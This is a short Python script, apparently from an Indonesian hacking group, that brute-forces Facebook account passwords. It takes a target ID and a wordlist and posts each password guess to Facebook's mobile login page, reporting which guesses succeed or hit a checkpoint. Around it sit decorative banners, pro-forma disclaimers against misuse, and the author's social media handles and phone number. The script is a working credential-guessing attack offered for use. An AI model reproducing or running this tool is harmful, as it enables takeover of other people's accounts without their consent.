#Author Nana Try From J4G454TRU_CYBER TE4M
import requests
import sys,threading,time


def t(text):
	for i in text + "\n":
		sys.stdout.write(i)
		sys.stdout.flush()
		time.sleep(0.02)

t ("\33[32m \tWELCOME \33[34mIN \33[31mJ4G454TRU_\33[35mCYBER \33[33mTE4M \33[0m")
print
print
print ("\33[34m ||||       ||||   ||||||||    ||||||||\33[0m")
print ("\33[34m ||| ||   || |||   |||   |||   |||\33[0m")
print ("\33[34m |||  || ||  |||   |||||||||   ||||||||\33[0m")
print ("\33[34m |||   |||   |||   |||   |||   |||\33[0m")
print ("\33[34m |||         |||   ||||||||    |||\33[0m")
print
print
t ("\33[31m Tools Ini Di Buat Bukan Untuk Kejahatan\33[0m")
t ("\33[31m Saya Cuma Berkreasi Saja\33[0m")
t ("\33[31m Dan Semoga Tools Ini Bisa Bermanfaat\33[0m")
t ("\33[31m Saya Minta Jangan Di Gunakan Untuk Kejahatan\33[0m")
t ("\33[31m Bila Terjadi Error Pada Tools Ini\33[0m")
t ("\33[31m Silahkan Hubungi Author\33[0m")
t ("\33[31m Siapkan Password Yang Keren Ya\33[0m")
t ("\33[31m Jangan Lupa Berdoa Dulu Biar Sucses\33[0m")
t ("\33[31m INGAT JANGAN DI SALAH GUNAKAN\33[0m")
t ("\33[31m Kalau Masing Ngeyel\33[0m")
t ("\33[31m Dosanya Tanggung Sendiri\33[0m")
t ("\33[31m Salam Damai\33[0m")
t ("\33[31m \t 👇 \t\33[0m")
t ("\33[31m J4G454TRU_CYBER TEAM\33[0m")
print
print
input ("\33[35m Press any key to continue \33[0m")
print
t ("\33[33m ______________________________________ \33[0m")
t ("\33[33m|                                      |\33[0m")
t ("\33[33m|\33[31m WELCHOME \33[32m IN \33[35m J4G454TRU_\33[32mCYBER \33[36m TEAM \33[33m | \33[0m")
t ("\33[33m|______________________________________| \33[0m")
print
t ("\33[34m Author : Nana Try \33[33m \33[0m")
print
t ("\33[32m Admin : Nana Try \33[0m")
print
t ("\33[33m YOUTUBE: Jagasatru TV\33[0m")
print
t ("\33[36m FACEBOOK: Nana Try \33[0m")
print
t ("\33[31m WA : +6283119248634 \33[0m")
print
t ("\33[36m BLOG : belajarbarengjagasatru.blogspot.com \33[0m")
print
t ("\33[35m TEAM :J4G454TRU_CYBER TE4M \33[0m")
t ("\33[33m __________________________________________ \33[0m")
t ("\33[32m \t\tJ4G454TRU-_TE4M \33[0m")
print

def login(id,pw):
	data = {'email':id,'pass':pw}
	r = requests.post('https://mbasic.facebook.com/login',data=data)
	if 'home.php?' in r.url or 'free' in r.url:
		t (f"\33[32m{id} | Sedang Mencoba Login.............\33[34m Selamat Login Berhasil Coy==>{pw}\33[0m")
	elif 'checkpoint' in r.url:
		t (f'\33[32m{id} | Sedang Mencoba Login..............\33[33m Akun Checkpoint Coy==>{pw}\33[0m')
	else:
		t (f'\33[32m{id} | Sedang Mencoba Login..............\33[31m Login Gagal Coy==>{pw} \33[0m')


def log(id,filenya):
	f = open(filenya,'r').readlines()
	for i in f:
		login(id,i.strip())

if __name__=='__main__':
	id = input("\33[34mMasukan ID: \33[0m")
	f =input("\33[33mMasukan WordlistPass: \33[0m")
log(id,f)
#Copyright 16 07 2020 | J4G454TRU_CYBER TE4M
